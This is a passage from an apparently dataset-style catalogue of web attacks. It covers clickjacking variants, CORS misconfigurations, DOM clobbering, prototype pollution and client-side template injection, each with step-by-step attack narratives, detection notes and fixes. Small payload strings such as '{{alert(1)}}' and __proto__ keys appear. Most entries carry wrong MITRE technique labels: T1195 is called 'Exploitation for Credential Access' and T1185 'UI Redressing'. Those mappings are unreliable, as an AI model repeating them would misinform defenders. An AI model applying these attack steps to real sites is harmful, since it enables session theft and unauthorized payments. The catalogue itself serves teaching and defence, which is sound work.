- **Attack Steps**: Step 1: Attacker identifies a vulnerable target website with important buttons (e.g., “Delete,” “Transfer”). Step 2: Attacker creates a malicious page with transparent elements positioned exactly over these buttons via CSS. Step 3: Victim visits the attacker’s page and tries to click visible buttons or links, but the clicks register on the hidden target buttons. Step 4: Victim unknowingly triggers dangerous actions like changing settings or making transactions. Step 5: The attacker gains control or causes damage without victim’s awareness. Step 6: Detection requires monitoring suspicious user activities and missing clickjacking protections. Step 7: Fix by setting proper X-Frame-Options or CSP frame-ancestors headers and UI confirmation dialogs for sensitive actions.
- **Detection**: Monitor logs for unexpected user requests
- **Solution**: Use clickjacking protection headers and confirm sensitive actions with user input
- **Tags**: Clickjacking, Overlay attacks

## Clickjacking via Nested Iframes

- **Attack Type**: Clickjacking
- **Target**: Web apps
- **Vulnerability**: Weak or missing frame policies
- **MITRE**: T1185 – UI Redressing
- **Impact**: User deception, unauthorized actions
- **Tools**: Browser devtools, Burp Suite
- **Scenario**: Multiple iframes are nested to confuse detection and bypass frame protection mechanisms.
- **Attack Steps**: Step 1: Attacker embeds the target website inside multiple nested iframes in a malicious page. Step 2: Some older browsers or misconfigured protections allow nested iframes to bypass simple frame denial policies. Step 3: Attacker uses CSS to make only the innermost iframe’s important buttons clickable and visible. Step 4: Victim clicks on attacker’s page, unknowingly interacting with the target site’s iframe elements. Step 5: Attacker exploits this to trick victims into performing unwanted actions. Step 6: Detection is harder as nested iframes mask the source; monitoring and using updated browser security policies helps. Step 7: Fix by using Content Security Policy (CSP) with frame-ancestors directive to whitelist allowed domains.
- **Detection**: Monitor frame embedding and suspicious user behavior
- **Solution**: Use CSP frame-ancestors with strict domain whitelisting
- **Tags**: Clickjacking, Nested frames

## Clickjacking Using CSS Pointer-Events Manipulation

- **Attack Type**: UI Redressing
- **Target**: Web apps
- **Vulnerability**: CSS misuse for click manipulation
- **MITRE**: T1185 – UI Redressing
- **Impact**: Unauthorized commands executed
- **Tools**: Browser devtools, Burp Suite
- **Scenario**: Attacker disables pointer events on visible elements to force clicks onto underlying hidden buttons.
- **Attack Steps**: Step 1: Attacker designs a malicious webpage where visible buttons have pointer-events: none CSS, disabling their clickability. Step 2: Underneath these buttons, hidden dangerous buttons from the target site’s iframe are placed. Step 3: When a user clicks on what appears to be a harmless button, the click actually goes to the hidden target button. Step 4: This results in the victim unintentionally triggering sensitive actions on the target site. Step 5: Victim remains unaware because visible UI behaves normally except clicks act differently. Step 6: Detection requires UI analysis and user feedback on unexpected behaviors. Step 7: Fix by enforcing frame embedding restrictions and implementing user action confirmations on sensitive actions.
- **Detection**: UI testing for pointer-events abuse
- **Solution**: Prevent framing via headers and confirm sensitive user actions
- **Tags**: Clickjacking, CSS attacks

## Drag-and-Drop UI Manipulation for Clickjacking

- **Attack Type**: Clickjacking
- **Target**: Web apps
- **Vulnerability**: Missing frame protections
- **MITRE**: T1185 – UI Redressing
- **Impact**: Unauthorized actions
- **Tools**: HTML5, JS, Burp Suite
- **Scenario**: Attacker tricks user by disguising drag-and-drop UI that actually triggers hidden clicks on target site.
- **Attack Steps**: Step 1: Attacker creates a webpage with draggable objects that look innocent (e.g., pictures). Step 2: The page overlays a transparent iframe of the target site underneath the drag-and-drop area. Step 3: When victim drags and drops items, those actions map to hidden buttons or inputs inside the target site iframe (e.g., confirming transactions). Step 4: Victim thinks they are just moving images but are unknowingly clicking dangerous controls. Step 5: Attacker uses social engineering to get victim to visit and interact with page. Step 6: Victim’s actions cause unauthorized changes on target site without their knowledge. Step 7: Detection involves UI behavior analysis and suspicious user activity logs. Step 8: Fix by enforcing clickjacking protections (X-Frame-Options, CSP frame-ancestors) and user confirmation on critical actions.
- **Detection**: User activity monitoring
- **Solution**: Use frame-ancestors CSP and X-Frame-Options headers; add confirmation dialogs for sensitive actions
- **Tags**: Clickjacking, Drag-and-Drop

## Clickjacking Targeting Social Media Share Buttons

- **Attack Type**: Clickjacking
- **Target**: Social media platforms
- **Vulnerability**: Missing frame protections
- **MITRE**: T1185 – UI Redressing
- **Impact**: Reputation damage, malware spread
- **Tools**: Browser devtools, HTML
- **Scenario**: Attacker tricks users into sharing content or spreading malicious links unknowingly.
- **Attack Steps**: Step 1: Attacker builds a malicious page embedding social media share buttons inside invisible frames. Step 2: User tries to click normal buttons but actually clicks hidden social media share controls. Step 3: Victim unknowingly shares malicious links or posts, spreading malware or phishing links. Step 4: The attacker gains wider reach by exploiting victim’s trust. Step 5: Detection includes monitoring unusual or automatic social media posts. Step 6: Fix by implementing frame restrictions and user interaction confirmation for sharing features.
- **Detection**: Monitoring for unusual posts
- **Solution**: Use clickjacking defenses and confirm shares with user input
- **Tags**: Clickjacking, Social Media

## Clickjacking on Mobile Browsers Using Touch Events

- **Attack Type**: Clickjacking
- **Target**: Mobile browsers
- **Vulnerability**: Incomplete frame protections
- **MITRE**: T1185 – UI Redressing
- **Impact**: Unauthorized mobile actions
- **Tools**: Mobile browser devtools
- **Scenario**: Mobile users tricked by touch input manipulation causing hidden clicks on sensitive mobile UI.
- **Attack Steps**: Step 1: Attacker creates a mobile-optimized malicious page with invisible iframes overlaid on interactive areas. Step 2: Using touch event manipulation, attacker tricks the victim’s taps to activate hidden buttons in the iframe (e.g., approve payment). Step 3: Victim thinks they are tapping safe buttons but triggers dangerous actions on target site. Step 4: Because mobile browsers handle touch events differently, standard protections may fail. Step 5: Detection involves mobile user behavior analysis and UI anomaly detection. Step 6: Fix by applying frame protections, mobile-specific security headers, and requiring explicit user confirmation.
- **Detection**: Mobile app logs and user reports
- **Solution**: Use frame-ancestors CSP headers; mobile-aware UI security designs
- **Tags**: Clickjacking, Mobile UI

## Clickjacking to Hijack Admin Panel Controls

- **Attack Type**: Clickjacking
- **Target**: Admin dashboards
- **Vulnerability**: Missing clickjacking protection
- **MITRE**: T1185 – UI Redressing
- **Impact**: Admin account compromise
- **Tools**: Burp Suite, HTML, JS
- **Scenario**: Attacker tricks admin users into performing unauthorized actions by overlaying admin panel UI.
- **Attack Steps**: Step 1: Attacker targets admin panel pages that lack clickjacking protection. Step 2: Malicious page embeds the admin panel as an iframe with transparent overlays to trick clicks. Step 3: Admin user visits attacker’s page and unknowingly clicks hidden admin controls (e.g., deleting users). Step 4: Attacker gains control or disrupts operations through victim’s privileges. Step 5: Detection includes monitoring admin activity logs for unexpected actions. Step 6: Fix by enforcing strict X-Frame-Options headers and adding multi-factor confirmations on admin operations.
- **Detection**: Admin log monitoring
- **Solution**: Use X-Frame-Options or CSP frame-ancestors; add MFA and confirmation for sensitive admin actions
- **Tags**: Clickjacking, Admin Panels

## Clickjacking on Payment Gateways to Steal Funds

- **Attack Type**: Clickjacking
- **Target**: Payment gateways
- **Vulnerability**: Missing clickjacking protection
- **MITRE**: T1185 – UI Redressing
- **Impact**: Financial theft, fund loss
- **Tools**: Browser devtools, Burp Suite
- **Scenario**: Attacker tricks users into authorizing payments or transfers by hiding real payment buttons.
- **Attack Steps**: Step 1: Attacker creates a page with a transparent iframe of a payment gateway. Step 2: Victim clicks on harmless UI elements but actually clicks “Pay” or “Transfer” buttons inside iframe. Step 3: Funds are transferred unknowingly to attacker’s account. Step 4: Victim remains unaware until checking bank or payment history. Step 5: Detection involves monitoring for unusual payment activity. Step 6: Fix by implementing clickjacking protection headers and requiring explicit user confirmations.
- **Detection**: Transaction monitoring and alerts
- **Solution**: Enforce frame restrictions and user confirmations on payments
- **Tags**: Clickjacking, Payment Fraud

## Clickjacking Using Full-Screen Iframes

- **Attack Type**: Clickjacking
- **Target**: Web apps
- **Vulnerability**: Missing frame protection
- **MITRE**: T1185 – UI Redressing
- **Impact**: Unauthorized actions, account compromise
- **Tools**: HTML, JavaScript
- **Scenario**: Attacker makes the victim’s entire screen covered by a transparent iframe of a target site to hijack clicks.
- **Attack Steps**: Step 1: Attacker creates a malicious page with a full-screen transparent iframe overlaying a trusted website or app interface. Step 2: Victim visits attacker’s page and sees what looks like a normal page but is actually seeing the attacker’s content with the trusted site behind a transparent iframe. Step 3: Any clicks, taps, or inputs from victim go directly to the invisible iframe instead of the visible UI. Step 4: Victim unknowingly clicks buttons or submits forms on the trusted site, performing actions like changing settings or authorizing transactions. Step 5: Because the iframe covers the entire screen, victim is completely unaware of the hijack. Step 6: Attacker can also combine this with social engineering to get victim to perform specific actions. Step 7: Detection is difficult without UI behavior monitoring but can involve detecting frame usage or unexpected interactions. Step 8: Fix by enforcing X-Frame-Options or Content Security Policy (CSP) frame-ancestors headers that prevent framing. Step 9: Also add explicit confirmation dialogs for critical actions.
- **Detection**: UI activity and frame detection
- **Solution**: Implement X-Frame-Options SAMEORIGIN or DENY; use CSP frame-ancestors; require confirmations on sensitive actions
- **Tags**: Clickjacking, Full-Screen

## Clickjacking with Time-Delayed UI Elements

- **Attack Type**: Clickjacking
- **Target**: Web apps
- **Vulnerability**: UI element visibility manipulation
- **MITRE**: T1185 – UI Redressing
- **Impact**: Unauthorized user actions
- **Tools**: JavaScript, HTML
- **Scenario**: Attacker hides UI elements temporarily and shows them only after victim is committed to interaction.
- **Attack Steps**: Step 1: Attacker creates a page with invisible iframe or overlay that initially hides dangerous UI elements. Step 2: Victim starts interacting with the page, clicking or typing on visible elements. Step 3: After a delay or certain user action, the attacker reveals hidden UI controls in the iframe (e.g., confirm payment button) exactly under the victim’s cursor or finger. Step 4: Victim unintentionally clicks these now-visible dangerous buttons thinking they are safe. Step 5: This bypasses some security checks that rely on visible UI at initial load. Step 6: Attacker uses timers or event triggers in JavaScript to control the reveal timing. Step 7: Detection requires behavior analysis to spot sudden UI changes during interaction. Step 8: Fix by adding frame protections and monitoring UI state changes, and requiring explicit user confirmation on critical actions.
- **Detection**: UI state monitoring and anomaly detection
- **Solution**: Use frame protection headers; implement UX best practices requiring user confirmation
- **Tags**: Clickjacking, Timing Attack

## Clickjacking Bypassing Content Security Policy (CSP)

- **Attack Type**: Clickjacking
- **Target**: Web apps
- **Vulnerability**: CSP bypass via CSS/JS loopholes
- **MITRE**: T1185 – UI Redressing
- **Impact**: Unauthorized access or action
- **Tools**: Advanced CSS, JS
- **Scenario**: Attacker uses creative CSS or browser quirks to bypass CSP frame restrictions and still frame target site.
- **Attack Steps**: Step 1: Site uses CSP with frame-ancestors to prevent framing, but attacker finds a browser quirk or CSS trick that still allows framing or partial UI overlay. Step 2: Attacker creates a page exploiting this loophole (e.g., abusing CSS transform, z-index, or filters) to overlay attacker UI on top or behind the target. Step 3: Victim interacts with attacker’s page thinking it’s safe, but clicks are forwarded or mapped to hidden target UI elements. Step 4: Victim performs sensitive actions without realizing. Step 5: These attacks are advanced and depend on browser or CSP weaknesses. Step 6: Detection involves security audits and monitoring for frame bypass attempts. Step 7: Fix by updating CSP policies regularly, patching browser vulnerabilities, and using other defenses like X-Frame-Options alongside CSP.
- **Detection**: Security audits and anomaly detection
- **Solution**: Regularly update CSP rules; patch browsers; combine CSP with X-Frame-Options; require user confirmation
- **Tags**: Clickjacking, CSP Bypass

## Clickjacking Using CSS Z-Index Abuse

- **Attack Type**: Clickjacking
- **Target**: Web apps
- **Vulnerability**: UI layering manipulation
- **MITRE**: T1185 – UI Redressing
- **Impact**: Unauthorized actions or UI manipulation
- **Tools**: CSS, HTML, Browser Devtools
- **Scenario**: Attacker uses CSS layering (z-index) to place invisible UI layers over target page to hijack clicks.
- **Attack Steps**: Step 1: Attacker designs a malicious page with multiple overlapping HTML elements. Step 2: Uses CSS z-index to place transparent or fake buttons over real buttons on the target site embedded in iframe or on same page. Step 3: Victim tries to click visible safe buttons but actually clicks the attacker’s invisible layer that forwards or triggers malicious actions. Step 4: Because the attacker controls layering, victim is unaware of the hijack. Step 5: Detection involves analyzing CSS layers and event handlers. Step 6: Fix by enforcing X-Frame-Options and disallowing embedding, also checking UI integrity and layering in UI security reviews.
- **Detection**: UI code analysis and penetration testing
- **Solution**: Use frame protection; validate UI layering and event flow; educate users on suspicious UI behavior
- **Tags**: Clickjacking, CSS Abuse

## Clickjacking to Steal Authentication Tokens via UI

- **Attack Type**: Clickjacking
- **Target**: Web apps, Auth systems
- **Vulnerability**: Token exposure through UI hijack
- **MITRE**: T1185 – UI Redressing
- **Impact**: Session hijacking, account takeover
- **Tools**: Browser Devtools, JS
- **Scenario**: Attacker tricks user into clicking UI elements that expose or transmit their auth tokens to attacker.
- **Attack Steps**: Step 1: Attacker creates a malicious page embedding a transparent iframe or overlays over trusted site UI. Step 2: Victim interacts with UI unknowingly clicking hidden controls that trigger actions exposing authentication tokens (e.g., via JS popups or URL leaks). Step 3: Tokens get sent to attacker-controlled servers via crafted JS or network requests. Step 4: Attacker captures tokens and uses them to hijack user sessions. Step 5: Victim remains unaware until session misuse occurs. Step 6: Detection requires monitoring token usage patterns and unexpected network calls. Step 7: Fix by implementing clickjacking protections and token confidentiality best practices (e.g., HttpOnly cookies).
- **Detection**: Token usage and network monitoring
- **Solution**: Use HttpOnly and Secure cookie flags; prevent framing; monitor token anomalies
- **Tags**: Clickjacking, Token Theft

## Access-Control-Allow-Origin: * Allowing All Origins

- **Attack Type**: Misconfigured CORS
- **Target**: Web apps, APIs
- **Vulnerability**: Open CORS policy
- **MITRE**: T1195 – Exploitation for Credential Access
- **Impact**: Data theft, session hijacking
- **Tools**: Browser devtools, curl
- **Scenario**: Server sets header Access-Control-Allow-Origin: * allowing any website to make requests.
- **Attack Steps**: Step 1: Server responds with Access-Control-Allow-Origin: * meaning any website can send requests to it via browser. Step 2: Malicious website tricks victim’s browser to send sensitive API request to the vulnerable server. Step 3: Server allows request and responds with sensitive data (e.g., user info). Step 4: Malicious site’s JavaScript reads this data via CORS because of the open wildcard. Step 5: Attacker steals victim’s private data or tokens. Step 6: Victim is unaware the request happened, as browser handles cross-origin requests automatically. Step 7: Fix by specifying only trusted origins in Access-Control-Allow-Origin, not *.
- **Detection**: CORS header scanning; traffic analysis
- **Solution**: Limit Access-Control-Allow-Origin to trusted sites; disable credentialed requests for wildcard origins
- **Tags**: CORS, Misconfiguration

## Null Origin Access Enabled in CORS Policy

- **Attack Type**: Misconfigured CORS
- **Target**: Web apps, APIs
- **Vulnerability**: Null origin allowed
- **MITRE**: T1195 – Exploitation for Credential Access
- **Impact**: Data theft, unauthorized access
- **Tools**: Browser devtools, curl
- **Scenario**: Server allows requests with Origin: null which is set by some browsers and file:// URLs.
- **Attack Steps**: Step 1: Some browsers send requests with Origin: null (e.g., from local files or sandboxed iframes). Step 2: Vulnerable server allows null origins by responding with Access-Control-Allow-Origin: null. Step 3: Attacker hosts malicious page from file:// or sandbox and triggers victim’s browser to send requests with null origin. Step 4: Server accepts and responds with sensitive info. Step 5: Malicious script reads sensitive data via CORS and leaks it to attacker. Step 6: Victim unaware due to browser automation. Step 7: Fix by blocking or validating null origins strictly in CORS policy.
- **Detection**: CORS policy audit; testing for null origin acceptance
- **Solution**: Do not allow null origin; explicitly list trusted origins; validate origin header server-side
- **Tags**: CORS, Security Misconfig

## Misconfigured Access-Control-Allow-Credentials Header

- **Attack Type**: Credential Exposure
- **Target**: Web apps, APIs
- **Vulnerability**: Credential leakage via CORS
- **MITRE**: T1195 – Exploitation for Credential Access
- **Impact**: Account hijacking, data breach
- **Tools**: Browser devtools, Burp Suite
- **Scenario**: Server incorrectly allows credentials (cookies, auth headers) from untrusted origins.
- **Attack Steps**: Step 1: Server sends Access-Control-Allow-Credentials: true but allows any origin (e.g., * or uncontrolled). Step 2: Malicious website forces victim’s browser to send requests with cookies/session tokens included. Step 3: Server processes requests with victim’s credentials and returns sensitive info. Step 4: Attacker’s JavaScript reads responses via CORS due to credentials allowed. Step 5: Attacker steals session tokens or private data and can hijack accounts. Step 6: Victim unaware of cross-origin data leak. Step 7: Fix by pairing Allow-Credentials: true with specific allowed origins only.
- **Detection**: Automated security scanning; CORS header validation
- **Solution**: Never combine Allow-Credentials: true with wildcard origins; explicitly specify allowed origins
- **Tags**: CORS, Credentials

## CORS Misconfiguration Allowing Credentialed Requests from Any Origin

- **Attack Type**: Credentialed Request Abuse
- **Target**: Web apps, APIs
- **Vulnerability**: Credentialed requests from any origin
- **MITRE**: T1195 – Exploitation for Credential Access
- **Impact**: Account compromise, data leak
- **Tools**: Browser devtools, Burp Suite
- **Scenario**: Server allows cross-origin requests with cookies from any origin without proper validation.
- **Attack Steps**: Step 1: Server accepts any origin in Access-Control-Allow-Origin and also allows credentials. Step 2: Attacker hosts malicious page that makes AJAX requests with withCredentials=true. Step 3: Victim’s browser includes cookies/session tokens automatically. Step 4: Server responds with sensitive user info, accessible to attacker’s JavaScript. Step 5: Attacker steals data and can perform actions as victim. Step 6: Victim unaware due to browser CORS handling. Step 7: Fix by enforcing strict origin checks and disallowing credentials for wildcard origins.
- **Detection**: Security audits; testing credentialed request acceptance
- **Solution**: Configure CORS to allow credentials only from trusted, specific origins
- **Tags**: CORS, Credential Leakage

## Reflective CORS Misconfiguration via User Input Injection

- **Attack Type**: Injection Attack
- **Target**: Web apps, APIs
- **Vulnerability**: Reflection in CORS header
- **MITRE**: T1195 – Exploitation for Credential Access
- **Impact**: Data theft, unauthorized access
- **Tools**: Burp Suite, curl
- **Scenario**: Server reflects user input in CORS headers without validation, allowing attacker-controlled origins.
- **Attack Steps**: Step 1: Server reflects parts of user-supplied input in Access-Control-Allow-Origin header. Step 2: Attacker crafts a malicious URL with origin set to attacker’s domain. Step 3: Victim’s browser sends request with attacker’s controlled origin. Step 4: Server responds allowing attacker’s origin due to reflection. Step 5: Attacker’s JavaScript reads sensitive data from response via CORS. Step 6: Attacker steals user data or tokens. Step 7: Victim unaware of the data leakage. Step 8: Fix by sanitizing and validating origin header strictly on server side; avoid reflecting user input directly in CORS headers.
- **Detection**: Input validation testing; header inspection
- **Solution**: Sanitize and whitelist allowed origins; never reflect untrusted user input directly in headers
- **Tags**: CORS, Injection

## CORS Preflight Bypass Attacks

- **Attack Type**: Preflight Request Abuse
- **Target**: Web apps, APIs
- **Vulnerability**: Preflight misconfiguration
- **MITRE**: T1195 – Exploitation for Credential Access
- **Impact**: Data leakage, unauthorized action
- **Tools**: Burp Suite, curl
- **Scenario**: Some servers skip CORS preflight checks or handle OPTIONS badly, allowing unsafe requests.
- **Attack Steps**: Step 1: Browser sends a "preflight" OPTIONS request to check if CORS request is safe. Step 2: Vulnerable server misconfigures OPTIONS handler and responds incorrectly or skips checks. Step 3: Attacker crafts malicious request that should be blocked but bypasses preflight. Step 4: Browser sends unsafe request (e.g., with custom headers). Step 5: Server processes unsafe request and leaks data or performs actions. Step 6: Attacker reads sensitive data via CORS. Step 7: Fix by properly handling OPTIONS and validating CORS preflight requests.
- **Detection**: Web server config review; preflight testing
- **Solution**: Properly configure OPTIONS requests; validate headers and origins; reject unsafe preflight requests
- **Tags**: CORS, Preflight

## Exploiting CORS with Browser Extensions

- **Attack Type**: Browser Extension Abuse
- **Target**: Web browsers
- **Vulnerability**: Extension bypass of CORS
- **MITRE**: T1195 – Exploitation for Credential Access
- **Impact**: Data theft, session hijacking
- **Tools**: Browser devtools
- **Scenario**: Browser extensions can bypass normal CORS by injecting scripts with higher privileges.
- **Attack Steps**: Step 1: Attacker convinces victim to install malicious browser extension. Step 2: Extension runs with permissions allowing cross-origin requests ignoring normal CORS restrictions. Step 3: Extension makes unauthorized requests to victim’s sensitive APIs. Step 4: Extension steals sensitive data like tokens or user info. Step 5: Extension sends stolen data to attacker’s server. Step 6: Victim unaware extension is malicious. Step 7: Mitigate by educating users, limiting extension permissions, and validating requests server-side.
- **Detection**: User reports, extension reviews
- **Solution**: Limit sensitive API access; enforce authentication & authorization on server side; educate users on safe extensions
- **Tags**: CORS, Browser Extensions

## CORS Misconfiguration Leading to Cross-Site Data Theft

- **Attack Type**: Data Theft via CORS
- **Target**: Web apps
- **Vulnerability**: Loose CORS policy
- **MITRE**: T1195 – Exploitation for Credential Access
- **Impact**: Sensitive data theft
- **Tools**: Browser devtools, curl
- **Scenario**: CORS policy too permissive allows attacker site to steal data from user’s session on another domain.
- **Attack Steps**: Step 1: Vulnerable site sets overly permissive CORS (e.g., wildcard origin or unsafe credentials). Step 2: Attacker hosts malicious site that sends cross-origin AJAX requests to victim site. Step 3: Victim logged into vulnerable site; browser includes session cookies. Step 4: Server responds with sensitive user data. Step 5: Attacker’s site reads data via CORS and exfiltrates it. Step 6: Victim unaware of the data leak. Step 7: Fix by restricting CORS origins and disallowing credentials with wildcards.
- **Detection**: CORS header analysis; penetration testing
- **Solution**: Restrict CORS origins; disallow credentials for wildcard origins; validate Origin header server-side
- **Tags**: CORS, Data Theft

## CORS Misconfiguration in REST APIs

- **Attack Type**: API Misconfigurations
- **Target**: APIs
- **Vulnerability**: API CORS misconfiguration
- **MITRE**: T1195 – Exploitation for Credential Access
- **Impact**: Data exposure, unauthorized API access
- **Tools**: Postman, curl, Burp Suite
- **Scenario**: REST APIs incorrectly configured for CORS allow unauthorized cross-origin access to API resources.
- **Attack Steps**: Step 1: REST API allows all origins (*) or reflects origin without validation in CORS headers. Step 2: Attacker’s malicious site makes AJAX requests to API from victim’s browser. Step 3: Browser sends cookies or tokens with request if credentials allowed. Step 4: API responds with private or sensitive data. Step 5: Attacker’s JavaScript reads response and sends it to attacker. Step 6: Victim unaware of data theft. Step 7: Fix by restricting allowed origins and enforcing authentication/authorization properly on API.
- **Detection**: API testing and code review
- **Solution**: Restrict CORS origins on APIs; require auth tokens; validate requests thoroughly
- **Tags**: CORS, API Security

## CORS Misconfiguration with Wildcard Subdomains

- **Attack Type**: Wildcard Subdomain Abuse
- **Target**: Web apps
- **Vulnerability**: Wildcard subdomain in CORS
- **MITRE**: T1195 – Exploitation for Credential Access
- **Impact**: Data theft, session hijacking
- **Tools**: Burp Suite, curl
- **Scenario**: Allowing *.example.com wildcard in CORS allows attacker-controlled subdomains to access user data.
- **Attack Steps**: Step 1: CORS policy uses wildcard for subdomains like *.example.com. Step 2: Attacker controls a subdomain (e.g., evil.example.com). Step 3: Attacker site sends AJAX requests to main domain from subdomain. Step 4: Browser includes cookies/session tokens. Step 5: Server allows subdomain due to wildcard and returns sensitive data. Step 6: Attacker reads data and steals info or hijacks sessions. Step 7: Fix by avoiding wildcard subdomains in CORS; explicitly list trusted subdomains.
- **Detection**: Penetration testing; CORS header review
- **Solution**: Avoid wildcards in subdomains; whitelist specific subdomains explicitly; use strict origin checks
- **Tags**: CORS, Wildcard Domains

## Using CORS to Steal Sensitive API Responses

- **Attack Type**: Data Theft via CORS
- **Target**: Web apps, APIs
- **Vulnerability**: Loose CORS policy
- **MITRE**: T1195 – Exploitation for Credential Access
- **Impact**: Data leakage, account takeover
- **Tools**: Browser devtools, curl
- **Scenario**: CORS misconfiguration allows attacker’s website to read private API responses from victim’s browser.
- **Attack Steps**: Step 1: Victim visits attacker’s malicious website. Step 2: The malicious site runs JavaScript to send a cross-origin request (AJAX/fetch) to a vulnerable API. Step 3: Victim’s browser includes cookies or tokens for the API due to CORS settings. Step 4: Vulnerable API responds with sensitive data. Step 5: Malicious script reads this data because CORS policy allows it. Step 6: Data is sent back to attacker’s server for misuse. Step 7: Mitigate by fixing CORS policies to restrict origins and credentials.
- **Detection**: CORS header and API response analysis
- **Solution**: Restrict origins, avoid wildcard *, disallow credentials with *; enforce authentication/authorization on server
- **Tags**: CORS, API Security

## Exploiting CORS Misconfigurations in SPAs

- **Attack Type**: SPA-Specific CORS Abuse
- **Target**: SPAs, APIs
- **Vulnerability**: Misconfigured CORS on APIs
- **MITRE**: T1195 – Exploitation for Credential Access
- **Impact**: Sensitive data exposure
- **Tools**: Browser devtools
- **Scenario**: Single Page Applications often rely heavily on APIs and misconfigured CORS can expose all user data to attackers.
- **Attack Steps**: Step 1: Attacker hosts malicious SPA or injects malicious JavaScript into existing SPA. Step 2: JavaScript sends cross-origin requests to backend APIs. Step 3: Due to misconfigured CORS, backend allows these requests from attacker origin. Step 4: Browser includes user’s cookies or tokens in requests. Step 5: API returns sensitive user data. Step 6: Attacker’s JavaScript reads and exfiltrates data. Step 7: Fix involves securing backend APIs and CORS policies, and validating frontend origins.
- **Detection**: SPA API traffic analysis
- **Solution**: Proper CORS configuration; use tokens; validate origins; limit sensitive data exposure
- **Tags**: CORS, SPA, API Security

## CORS Misconfiguration on WebSocket Connections

- **Attack Type**: WebSocket CORS Bypass
- **Target**: Web apps, WebSocket
- **Vulnerability**: Misconfigured WebSocket CORS
- **MITRE**: T1195 – Exploitation for Credential Access
- **Impact**: Real-time data theft or manipulation
- **Tools**: WebSocket clients
- **Scenario**: WebSocket servers with misconfigured CORS allow unauthorized cross-origin connection establishment.
- **Attack Steps**: Step 1: Attacker’s site initiates WebSocket connection to vulnerable server. Step 2: Server accepts connections from any origin or does not validate origin properly. Step 3: Browser allows attacker’s site to open WebSocket connection. Step 4: Attacker sends and receives sensitive data over WebSocket connection. Step 5: Attacker reads or manipulates sensitive real-time data. Step 6: Fix by validating Origin header on WebSocket handshake, restricting allowed origins strictly.
- **Detection**: WebSocket handshake monitoring
- **Solution**: Enforce strict Origin checks on WebSocket handshake; restrict allowed origins; authenticate users on connection
- **Tags**: CORS, WebSocket

## CORS Misconfiguration in Mobile Hybrid Apps

- **Attack Type**: Mobile Hybrid App Abuse
- **Target**: Mobile apps
- **Vulnerability**: Loose CORS policy
- **MITRE**: T1195 – Exploitation for Credential Access
- **Impact**: Sensitive data leakage on mobile
- **Tools**: Mobile device, proxy
- **Scenario**: Mobile hybrid apps (e.g., Cordova, React Native) with CORS issues allow malicious apps/sites to access APIs.
- **Attack Steps**: Step 1: Mobile hybrid app loads web content with API calls. Step 2: Backend API allows all origins or untrusted origins via CORS. Step 3: Malicious app or website running on mobile triggers API calls with victim’s credentials. Step 4: API responds with sensitive data due to CORS policy. Step 5: Malicious app reads and leaks sensitive data. Step 6: Fix by restricting CORS origins, validating requests, and implementing app-side protections.
- **Detection**: Mobile network traffic analysis
- **Solution**: Tighten CORS policies; restrict origins; secure mobile app communication with auth and encryption
- **Tags**: CORS, Mobile Security

## Exploiting CORS in OAuth2 Authorization Code Flow

- **Attack Type**: OAuth2 Flow Manipulation
- **Target**: OAuth2, APIs
- **Vulnerability**: OAuth2 CORS Misconfiguration
- **MITRE**: T1195 – Exploitation for Credential Access
- **Impact**: Account takeover, token theft
- **Tools**: Browser devtools, curl
- **Scenario**: Misconfigured CORS allows attacker to steal OAuth2 tokens during the authorization process.
- **Attack Steps**: Step 1: Victim initiates OAuth2 login (authorization code flow). Step 2: OAuth2 server responds with tokens or code. Step 3: Due to loose CORS, attacker’s malicious site makes cross-origin requests to OAuth2 endpoints. Step 4: Browser includes victim’s credentials or tokens in these requests. Step 5: Attacker’s site reads tokens via CORS policy and steals OAuth2 access tokens or refresh tokens. Step 6: Attacker uses tokens to impersonate victim or access APIs. Step 7: Fix by strict CORS origin validation on OAuth endpoints and token endpoints.
- **Detection**: OAuth2 flow testing, token interception
- **Solution**: Enforce strict CORS on OAuth endpoints; use secure cookies; monitor OAuth token usage
- **Tags**: CORS, OAuth2

## DOM Clobbering to Hijack Client-Side Variables

- **Attack Type**: Client-Side Variable Hijacking
- **Target**: Browsers, Web apps
- **Vulnerability**: Unsafe variable naming in JS
- **MITRE**: T1185 (DOM Manipulation)
- **Impact**: Data theft, script hijack
- **Tools**: Browser Devtools, Burp Suite
- **Scenario**: Attacker uses malicious HTML elements with specific names or IDs to overwrite JavaScript variables or functions
- **Attack Steps**: 1. Victim visits attacker-controlled or vulnerable page. 2. Attacker injects HTML elements (like <input id="location">) that have special names matching variables used by JavaScript. 3. JavaScript code accesses these elements expecting safe data but instead reads attacker-controlled elements. 4. Attacker’s payload hijacks the script execution or data. 5. This can lead to changing behavior or stealing data.
- **Detection**: Browser console and code review
- **Solution**: Use unique IDs/names; sanitize DOM access; avoid direct element-variable mapping
- **Tags**: DOM, Client-Side, JS

## JavaScript Prototype Pollution via Client-Side Objects

- **Attack Type**: Prototype Pollution
- **Target**: Browsers, Web apps
- **Vulnerability**: Unsafe object merging
- **MITRE**: T1185 (DOM Manipulation)
- **Impact**: Client-side logic corruption
- **Tools**: Browser Devtools, Burp Suite
- **Scenario**: Attacker modifies JavaScript object prototypes to change app behavior or trigger code execution
- **Attack Steps**: 1. Attacker sends crafted input containing keys like __proto__ or constructor in JSON or forms. 2. Vulnerable JS merges attacker input into objects without sanitization. 3. This alters the prototype of built-in JS objects globally. 4. Application uses polluted prototypes causing unexpected behavior or executing attacker code. 5. Attacker gains control over client-side logic.
- **Detection**: Static/dynamic code analysis
- **Solution**: Sanitize inputs; use safe merging functions; avoid merging attacker data into prototypes
- **Tags**: JS, Prototype Pollution

## Client-Side Template Injection (CSTI)

- **Attack Type**: Code Injection via Templates
- **Target**: Browsers, Web apps
- **Vulnerability**: Unsafe template rendering
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Script execution, XSS
- **Tools**: Browser Devtools
- **Scenario**: Attacker injects malicious code into client-side templates rendering dynamic content
- **Attack Steps**: 1. Victim loads app which uses JS templates (e.g., Mustache, Handlebars). 2. Attacker submits input containing template syntax (e.g., {{alert(1)}}). 3. Template engine renders attacker input as executable JS code. 4. Malicious script runs inside victim’s browser. 5. Attacker steals cookies, performs actions, or changes UI.
- **Detection**: Content security policy logs
- **Solution**: Sanitize inputs; avoid rendering untrusted data as templates; use strict template engines
- **Tags**: JS, Template Injection

## Unsafe Use of eval() in JavaScript Leading to Code Injection

- **Attack Type**: Code Injection via eval()
- **Target**: Browsers, Web apps
- **Vulnerability**: Use of eval() on unsafe data
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Remote code execution on client
- **Tools**: Browser Devtools
- **Scenario**: Dangerous use of eval() runs attacker-controlled code inside the browser
